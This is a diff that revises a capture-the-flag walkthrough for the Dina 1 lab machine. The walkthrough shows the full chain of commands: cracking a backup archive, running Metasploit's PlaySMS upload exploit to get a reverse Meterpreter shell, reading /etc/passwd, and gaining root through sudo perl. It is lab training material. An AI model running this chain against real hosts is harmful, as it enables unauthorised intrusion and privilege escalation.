@@ -174,13 +174,13 @@ Task Completed
 
 During enumeration, we discovered the `/secure/` directory.  
 
-#### Accessing `/secure/`  
+Accessing `/secure/`  
 
 Visiting `http://192.168.1.5/secure/` reveals a file named `backup.zip`.  
 
 ![Secure](/assets/img/bposts/dina-1-walkthrough/secure.png)  
 
-#### Downloading `backup.zip`  
+Downloading `backup.zip`  
 
 To download the file, we use:  
 
@@ -188,7 +188,9 @@ To download the file, we use:
 wget http://192.168.1.5/secure/backup.zip
 ```  
 
-#### Extracting `backup.zip`  
+This command downloads `backup.zip` from the web server to our local system for inspection.
+
+Extracting `backup.zip`  
 
 Attempting to unzip the file:  
 
@@ -237,9 +239,9 @@ We previously discovered potential passwords in the `/nothing` page’s source c
 {: .prompt-info }
 
 
-### Extracting `backup.zip`  
+Extracting `backup.zip`  
 
-Using the previously discovered password `freedom`, we extract the archive using `7z`:  
+Using the previously discovered passwords on source code of `nothing` pass : `freedom`, we extract the archive using `7z`:  
 
 ```bash
 root@neo ~# 7z x -p"freedom" backup.zip
@@ -307,16 +309,16 @@ Using the username `touhid`, we attempt different passwords from the `/nothing` 
 After multiple attempts, the correct password is **`diana`**.  
 
 
+## Exploiting PlaySMS
 
-after spending hours i cant find anything on this page lets check google any exploit available
+After spending hours searching, I couldn't find anything useful on this page. Let’s check Google for any available exploits.
 
-after searching i found some exploit also we can use metasploit here
+Upon searching, I found some vulnerabilities, and we can leverage Metasploit to exploit them.
 
+#### Launching Metasploit
 
 ```bash
 root@neo ~# msfconsole
-This copy of metasploit-framework is more than two weeks old.
- Consider running 'msfupdate' to update to the latest version.
 Metasploit tip: Use help <command> to learn more about any command
                                                   
                                    ____________
@@ -338,7 +340,11 @@ Metasploit tip: Use help <command> to learn more about any command
 + -- --=[ 9 evasion                                       ]
 
 Metasploit Documentation: https://docs.metasploit.com/
+```
 
+#### Now, let’s search for PlaySMS exploits:
+
+```bash
 msf6 > search playsms
 
 Matching Modules
@@ -356,10 +362,9 @@ Interact with a module by name or index. For example info 2, use 2 or use exploi
 msf6 > 
 ```
 
+Here Three Exploits Available
 
-here we can see 3 exploits available
-
-lets use first exploit
+We will use the first exploit:
 
 ```bash
 msf6 > use 0
@@ -399,7 +404,7 @@ Exploit target:
 View the full module info with the info, or info -d command.
 ```
 
-Choosing `exploit/multi/http/playsms_uploadcsv_exec`:
+#### Configuring the Exploit
 
 ```bash
 msf6 exploit(multi/http/playsms_uploadcsv_exec) > set RHOSTS 192.168.1.5
@@ -415,7 +420,7 @@ LHOST => 192.168.1.8
 msf6 exploit(multi/http/playsms_uploadcsv_exec) > exploit
 ```
 
-Successfully obtaining a Meterpreter session:
+Obtaining a Meterpreter Session and explore the target filesystem
 
 ```bash
 [*] Started reverse TCP handler on 192.168.1.8:4444 
@@ -537,8 +542,9 @@ touhid:x:1000:1000:touhid,,,:/home/touhid:/bin/bash
 mysql:x:115:125:MySQL Server,,,:/nonexistent:/bin/false
 ```
 
-Lets access to shell
+#### Privilege Escalation
 
+We spawn a shell:
 
 ```bash
 meterpreter > shell
@@ -546,6 +552,10 @@ Process 2865 created.
 Channel 1 created.
 whoami
 www-data
+```
+Check sudo privileges:
+
+```bash
 sudo -l
 Matching Defaults entries for www-data on this host:
     env_reset,
@@ -554,7 +564,8 @@ Matching Defaults entries for www-data on this host:
 User www-data may run the following commands on this host:
     (ALL) NOPASSWD: /usr/bin/perl
 ```
-exploit to root
+
+Since perl has unrestricted sudo access, we exploit it:
 
 ```bash
 sudo perl -e 'exec "/bin/bash";'
